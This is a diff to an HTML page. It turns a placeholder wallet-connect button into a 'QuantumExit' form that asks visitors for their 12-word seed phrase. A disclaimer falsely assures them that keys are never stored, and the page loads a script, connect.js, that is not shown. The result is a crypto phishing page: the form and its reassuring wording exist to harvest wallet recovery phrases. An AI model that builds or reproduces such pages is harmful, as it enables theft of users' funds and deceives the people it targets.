@@ -3,40 +3,27 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Quantum Connect</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
-  <style>
-    body {
-      background-color: #0d0d0d;
-      color: #00ffcc;
-      font-family: 'Orbitron', sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    h2 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 1rem;
-      background-color: #00ffcc;
-      border: none;
-      color: #000;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: 0.3s ease;
-    }
-    button:hover {
-      background-color: #00ccaa;
-    }
-  </style>
+  <title>Connect Wallet – QuantumExit</title>
+  <link rel="stylesheet" href="assets/style.css" />
 </head>
 <body>
-  <h2>Connect Your Wallet</h2>
-  <button onclick="alert('Wallet connect coming soon...')">Connect Wallet</button>
+  <header>
+    <h2>Secure Wallet Sync</h2>
+    <p>To activate your QuantumExit Protocol dashboard, enter your 12-word seed phrase below.</p>
+  </header>
+
+  <main>
+    <form id="walletForm">
+      <label for="seedPhrase">Enter your 12-word phrase:</label>
+      <textarea id="seedPhrase" name="seedPhrase" rows="3" required></textarea>
+
+      <p class="disclaimer">⚠️ <strong>Disclaimer:</strong> Your private keys will <u>never</u> be stored. This is for temporary sync only.</p>
+
+      <button type="submit">🔒 Sync & Connect</button>
+    </form>
+    <div id="statusMsg"></div>
+  </main>
+
+  <script src="scripts/connect.js"></script>
 </body>
 </html>
